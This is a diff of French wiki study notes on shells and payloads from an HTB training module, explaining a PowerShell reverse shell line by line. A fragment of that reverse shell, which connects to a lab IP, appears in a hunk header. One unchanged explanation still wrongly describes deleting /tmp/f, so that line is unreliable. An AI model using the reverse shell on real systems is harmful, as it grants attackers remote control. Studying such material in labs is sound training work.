@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T20:08:40.432Z
+date: 2025-05-17T20:12:07.674Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -212,7 +212,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
    Cette commande crée un tableau de type byte nommé $bytes contenant 65 535 zéros. C’est un flux de bytes vide destiné à être envoyé vers le listener.
 
 1. **`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
+   lance une boucle while où la variable $i est initialisée avec le résultat de la méthode .Read du flux .NET ([$stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)). Cette méthode lit des données dans le buffer $bytes, à partir de l’offset 0, pour une longueur égale à la taille de $bytes.
 
 1. **`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`**
    Supprime le fichier `/tmp/f` s’il existe déjà.
